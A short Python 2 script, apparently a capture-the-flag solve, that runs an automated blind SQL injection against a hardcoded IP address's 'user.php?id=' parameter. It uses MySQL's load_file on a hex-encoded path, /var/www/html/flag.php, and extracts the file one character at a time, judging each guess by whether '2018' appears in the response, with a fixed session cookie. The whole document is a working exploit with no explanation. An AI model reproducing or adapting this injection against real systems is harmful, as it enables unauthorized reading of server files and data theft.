#coding=utf-8
import requests
target="http://101.71.29.5:10011/user/user.php?id="
yu="0123456789ABCDEF"
ses=requests.session()
ses.keep_alive=False
def get():
	flag=""
	while True:
		for i in yu:
			payload="1-if((hex(load_file(0x2F7661722F7777772F68746D6C2F666C61672E706870)) like 0x"+flag+(i+'%').encode('hex')+"),0,1)"
			#print payload
			cont=ses.get(target+payload,cookies={"PHPSESSID":"3u8u1s292r3v58cc82b4b6l2c1"}).content
			#print cont
			if "2018" in cont:
				flag+=i.encode('hex')
				print flag
				break
		print "end"
get()
			
	
